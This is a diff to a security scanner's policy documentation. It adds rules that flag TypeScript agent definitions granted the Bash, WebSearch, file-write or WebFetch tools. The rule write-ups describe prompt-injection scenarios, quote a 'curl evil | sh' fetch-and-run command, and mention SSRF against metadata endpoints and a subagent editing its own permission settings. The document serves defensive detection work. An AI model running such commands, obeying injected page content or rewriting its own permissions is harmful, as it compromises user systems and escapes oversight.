@@ -33,6 +33,26 @@ rules:
     confidence: 0.9
     scope: agent
     fix_type: config
+  - id: CSDK-121
+    severity: high
+    confidence: 0.8
+    scope: agent
+    fix_type: config
+  - id: CSDK-122
+    severity: medium
+    confidence: 0.8
+    scope: agent
+    fix_type: config
+  - id: CSDK-123
+    severity: high
+    confidence: 0.8
+    scope: agent
+    fix_type: config
+  - id: CSDK-124
+    severity: high
+    confidence: 0.75
+    scope: agent
+    fix_type: config
   - id: CSDK-130
     severity: high
     confidence: 0.8
@@ -50,9 +70,9 @@ references: [LLM01, LLM06]
 
 **Policy ID:** `claude_sdk_agent_safety`  
 **File:** `claude_sdk/agent_safety.yaml`  
-**Rules:** CSDK-101, CSDK-102, CSDK-103, CSDK-104, CSDK-105, CSDK-120, CSDK-130, CSDK-131  
-**Severities:** high, medium, high, high, high, high, high, high  
-**Fix types:** config, config, config, config, config, config, config, config  
+**Rules:** CSDK-101, CSDK-102, CSDK-103, CSDK-104, CSDK-105, CSDK-120, CSDK-121, CSDK-122, CSDK-123, CSDK-124, CSDK-130, CSDK-131  
+**Severities:** high, medium, high, high, high, high, high, medium, high, high, high, high  
+**Fix types:** config, config, config, config, config, config, config, config, config, config, config, config  
 **References:** LLM01, LLM06
 
 ---
@@ -248,6 +268,129 @@ with no secrets or network) where bypass is a defensible choice. Matches the
 Python sibling CSDK-103's 0.9. A false negative remains for the session-level
 `permissionMode` set on `ClaudeAgentOptions`/`query(...)` rather than on the
 `AgentDefinition` — that is a separate detection surface, not covered here.
+
+### CSDK-121 — TypeScript AgentDefinition is granted the Bash tool (Severity: high, Confidence: 0.8, Fix type: config)
+
+**What we detect:**
+A TypeScript `AgentDefinition` (a typed const or an inline entry in
+`options.agents`) whose `tools` array contains `Bash`
+(`agent_grants_builtin_tool: [Bash]`, matched against the definition's resolved
+`ToolRefs`). This is the TypeScript sibling of CSDK-101 — before it existed, a
+TS `AgentDefinition` granting `Bash` produced no finding at all, because
+CSDK-101 is gated `language: python`.
+
+**Why it is flaggable:**
+`Bash` is arbitrary shell execution handed to an autonomously-dispatched
+subagent with no guardrail layer; the language the definition is authored in
+does not change the privilege.
+
+**Real-world consequence:**
+A "research" subagent granted `Bash` can be steered by a poisoned task
+description into running `curl evil | sh` or reading credentials — no human in
+the loop.
+
+**Why severity is high and not medium:**
+Shell access is maximal agency; combined with autonomous dispatch the exposure
+is direct. Matches the Python sibling CSDK-101's high. Not critical because
+exploitation still needs the subagent to be driven to it.
+
+**Fix type — config:**
+Remove `Bash` from the definition's `tools` array, or gate it with a PreToolUse
+hook — a wiring change, not tool code.
+
+**Confidence 0.8:**
+Same calibration as CSDK-101: a subagent may legitimately need shell for its
+job, and the grant alone cannot distinguish a justified `Bash` from an
+over-broad one. The residual false negative is a `tools` array supplied through
+a non-literal expression the static read cannot resolve.
+
+### CSDK-122 — TypeScript AgentDefinition is granted the WebSearch tool (Severity: medium, Confidence: 0.8, Fix type: config)
+
+**What we detect:**
+A TypeScript `AgentDefinition` whose `tools` array contains `WebSearch` — the
+TypeScript sibling of CSDK-102.
+
+**Why it is flaggable:**
+WebSearch results are untrusted external data with no SDK-level filtering; an
+autonomously-dispatched subagent processes whatever the search returns, so
+attacker-controlled pages are an indirect prompt-injection channel into the
+agentic loop.
+
+**Real-world consequence:**
+An injected task steers the subagent to search for and retrieve an
+attacker-controlled page whose content instructs the agent further —
+exfiltrating data or invoking other granted tools.
+
+**Why severity is medium and not high:**
+Search is one step removed from direct execution: the retrieved content must
+still steer a subsequent action through whatever else the agent is granted.
+Matches CSDK-102's medium.
+
+**Fix type — config:**
+Remove `WebSearch` from the `tools` array or gate queries with a PreToolUse
+hook — a wiring change.
+
+**Confidence 0.8:**
+As with CSDK-102, a research-oriented subagent may legitimately need search;
+the grant alone cannot tell a justified use from an over-broad one.
+
+### CSDK-123 — TypeScript AgentDefinition is granted filesystem-write built-ins (Severity: high, Confidence: 0.8, Fix type: config)
+
+**What we detect:**
+A TypeScript `AgentDefinition` whose `tools` array contains a filesystem-write
+built-in (`Write`, `Edit`, `MultiEdit`, `NotebookEdit`) — the TypeScript
+sibling of CSDK-104.
+
+**Why it is flaggable:**
+Write access lets an autonomously-dispatched subagent modify source,
+configuration, or the `.claude/settings.json` that governs its own permissions,
+with no guardrail mechanism on `AgentDefinition` itself.
+
+**Real-world consequence:**
+A prompt-injected task drives the subagent to rewrite a config file or plant
+code in the repo — comparable blast radius to shell execution, and a
+persistence vector (edits survive the session).
+
+**Why severity is high and not medium:**
+File mutation is direct, persistent side effect; self-modifying-permissions is
+the escalation path. Matches CSDK-104's high.
+
+**Fix type — config:**
+Remove the write built-ins from the `tools` array, scope the writable area, and
+gate writes with a PreToolUse hook — wiring changes.
+
+**Confidence 0.8:**
+An editing subagent may genuinely need write tools; the grant alone cannot
+distinguish justified from over-broad, mirroring CSDK-104.
+
+### CSDK-124 — TypeScript AgentDefinition is granted the WebFetch tool (Severity: high, Confidence: 0.75, Fix type: config)
+
+**What we detect:**
+A TypeScript `AgentDefinition` whose `tools` array contains `WebFetch` — the
+TypeScript sibling of CSDK-105.
+
+**Why it is flaggable:**
+`WebFetch` takes a direct, model-chosen URL: attacker-controlled page content
+re-enters the loop (indirect prompt injection) and the model can point the
+fetch at internal addresses (server-side request forgery), with no SDK-level
+filtering of the fetched content.
+
+**Real-world consequence:**
+An injected instruction makes the subagent fetch an attacker's page whose
+content hijacks the loop, or aims the fetch at a cloud metadata endpoint /
+internal admin port the agent host can reach.
+
+**Why severity is high and not medium:**
+Unlike search (CSDK-122), fetch is direct URL control — both the injection and
+the SSRF surface are one call away. Matches CSDK-105's high.
+
+**Fix type — config:**
+Remove `WebFetch` from the `tools` array or gate it with a PreToolUse hook that
+allowlists hosts and blocks internal ranges — a wiring change.
+
+**Confidence 0.75:**
+Slightly below the Bash/write rules because fetch-needing subagents are more
+common in legitimate research roles, mirroring CSDK-105's calibration.
 
 ### CSDK-130 — TypeScript query() main agent is granted the Bash tool (Severity: high, Confidence: 0.8, Fix type: config)
 
